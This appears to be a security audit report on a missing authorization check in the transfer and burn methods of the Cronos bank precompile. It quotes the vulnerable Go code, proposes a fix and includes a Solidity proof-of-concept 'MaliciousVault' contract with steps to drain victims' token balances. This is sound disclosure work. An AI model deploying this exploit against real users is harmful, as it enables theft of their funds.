### Title
Bank Precompile `transfer` Allows Unauthorized Drain of `evm/<contract>` Native Tokens from Any Holder — (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `transfer` method of the `BankContract` precompile does not verify that the calling contract is authorized to move tokens on behalf of the `sender` argument. Any unprivileged contract deployer can transfer `evm/<its_own_address>` native tokens out of any holder's account without that holder's consent.

### Finding Description
In `BankContract.Run()`, the `TransferMethodName` branch unpacks `sender` directly from the ABI-encoded call arguments and passes it as the `from` address to `bankKeeper.SendCoins`:

```go
// x/cronos/keeper/precompiles/bank.go  lines 167-200
case TransferMethodName:
    ...
    sender    := args[0].(common.Address)   // ← caller-supplied, not verified
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    ...
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    ...
    denom := EVMDenom(contract.Caller())    // evm/<calling contract>
    amt   := sdk.NewCoin(denom, ...)
    ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()` and no allowance/approval mechanism. The only guards present are:

- `readonly` flag check
- `amount > 0`
- `checkBlockedAddr(to)` (module-account blocklist)
- `IsSendEnabledCoins`

None of these prevent a contract from supplying an arbitrary victim address as `sender`. Because `denom = EVMDenom(contract.Caller())`, the contract can only move tokens of its own denom — but it can move them **from any address that holds them**, without that address ever signing or approving the operation.

The same missing-authorization pattern exists in the `BurnMethodName` branch (lines 113–155), where `recipient` (the address to burn from) is also caller-supplied with no ownership check, enabling a contract to destroy any holder's `evm/<contract>` balance.

### Impact Explanation
**Critical — Unauthorized transfer/burn of precompile-controlled assets.**

`evm/<contract_address>` tokens are native Cosmos bank-module coins managed exclusively through the bank precompile. They fall squarely within the "precompile-controlled assets" category. A malicious contract can:

1. Mint `evm/<contract>` tokens to users (e.g., as DeFi receipt/LP tokens).
2. At any later time, call `transfer(victim, attacker, balance)` on the bank precompile to drain every holder's balance to the attacker's address — with no transaction from the victim required.
3. Alternatively call `burn(victim, balance)` to destroy the victim's holdings.

This is an unconditional, on-chain theft path requiring zero cooperation from the victim after they have received the tokens.

### Likelihood Explanation
**Medium.** The attacker must:
- Deploy a contract (permissionless on Cronos).
- Induce users to hold `evm/<contract>` tokens (e.g., by presenting the contract as a legitimate DeFi vault, staking contract, or wrapped-asset issuer).

No privileged keys, governance access, or validator compromise are required. The attack is fully executable by any EVM account.

### Recommendation
In the `TransferMethodName` branch, enforce that the `sender` argument equals the calling contract's own address, or implement an ERC-20-style allowance mapping so that a contract can only move tokens it holds or has been explicitly approved to spend:

```go
// Enforce: only the calling contract may initiate a transfer on behalf of sender
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, redesign the method so that `sender` is always derived from `contract.Caller()` (matching the pattern used for `denom`), and expose a separate `transferFrom(owner, spender, recipient, amount)` with an on-chain allowance check.

Apply the same fix to the `BurnMethodName` branch, where `recipient` (the address burned from) is equally unchecked.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    // address(0x64)
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract MaliciousVault {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));

    // Step 1: lure users — mint receipt tokens to them
    function deposit(address user, uint256 amount) external {
        BANK.mint(user, amount);   // user now holds evm/<this> tokens
    }

    // Step 2: drain — no user signature required
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller is this contract — no auth check in precompile
        BANK.transfer(victim, attacker, amount);
    }
}
```

Execution:
1. Deploy `MaliciousVault` on Cronos.
2. Call `deposit(alice, 1000)` — Alice now holds 1000 `evm/<MaliciousVault>` native tokens.
3. Call `drain(alice, attacker, 1000)` — the bank precompile executes `SendCoins(alice → attacker, 1000 evm/<MaliciousVault>)` with no authorization from Alice.
4. Alice's balance is zero; attacker holds 1000 tokens.

The root cause is at [1](#0-0)  — `sender` is taken from call arguments with no check against `contract.Caller()`, while `denom` is correctly scoped to `contract.Caller()` at line 186. The same pattern in the `burn` branch is at [2](#0-1) .

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L113-155)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```
